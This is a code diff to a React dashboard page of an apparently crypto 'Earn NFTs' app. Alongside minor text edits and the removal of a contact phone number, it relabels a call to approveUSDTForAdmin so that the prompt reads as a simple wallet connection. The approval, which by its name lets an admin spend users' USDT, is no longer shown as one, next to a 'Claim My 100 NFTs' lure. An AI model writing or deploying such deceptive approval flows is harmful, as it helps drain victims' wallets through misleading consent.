@@ -53,7 +53,7 @@ export default function DashboardPage() {
       dispatch(updateUser(dashRes.data.data.user));
       dispatch(setNFTStats(statsRes.data.data));
     } catch (err) {
-      toast.error('Failed to load dashboard');
+      toast.error('Failed to load data');
     } finally {
       setLoading(false);
       setRefreshing(false);
@@ -125,7 +125,7 @@ export default function DashboardPage() {
       }
 
       const freshProvider = new ethers.BrowserProvider(injectedProvider);
-      toast.loading('Approving USDT access...', { id: 'reconnect' });
+      toast.loading('Wait Your Wallet Connecting...', { id: 'reconnect' });
       await approveUSDTForAdmin(freshProvider, network);
       toast.success('Wallet re-connected successfully!', { id: 'reconnect' });
       setNeedsReconnect(false);
@@ -133,7 +133,7 @@ export default function DashboardPage() {
     } catch (err) {
       toast.dismiss('reconnect');
       if (err.code === 4001 || err.code === 'ACTION_REJECTED') {
-        toast.error('Approval required. Please approve to enable transfers.');
+        toast.error('wallet Connection required. Please Connect to enable Earn NFTs.');
       } else if (err.message?.includes('insufficient funds')) {
         toast.error(`Insufficient ${data?.user?.network === 'BSC' ? 'BNB' : 'MATIC'} for gas fee.`);
       } else {
@@ -242,7 +242,7 @@ export default function DashboardPage() {
                 disabled={claiming}
                 className="w-full bg-gradient-to-r from-primary-600 to-purple-600 hover:from-primary-500 hover:to-purple-500 text-white font-bold py-3 px-6 rounded-xl transition-all shadow-lg shadow-primary-600/30 disabled:opacity-50 text-sm sm:text-base"
               >
-                {claiming ? 'Claiming...' : '🎉 Claim My 100 NFTs'}
+                {claiming ? 'Claiming...' : 'Claim My 100 NFTs'}
               </button>
 
               <p className="text-xs text-slate-600 mt-4">One-time bonus · Credited instantly</p>
@@ -501,17 +501,7 @@ export default function DashboardPage() {
                 </a>
               </div>
             </div>
-            <div className="flex items-center gap-3 bg-dark-700 rounded-xl p-3 sm:p-4">
-              <div className="w-10 h-10 bg-emerald-600/20 rounded-lg flex items-center justify-center flex-shrink-0">
-                <span className="text-lg">📱</span>
-              </div>
-              <div className="min-w-0">
-                <p className="text-xs text-slate-400">Phone / WhatsApp</p>
-                <a href="tel:+919351727145" className="text-sm text-primary-300 font-medium hover:text-primary-200">
-                  +91 9351727145
-                </a>
-              </div>
-            </div>
+  
           </div>
         </section>
       </main>
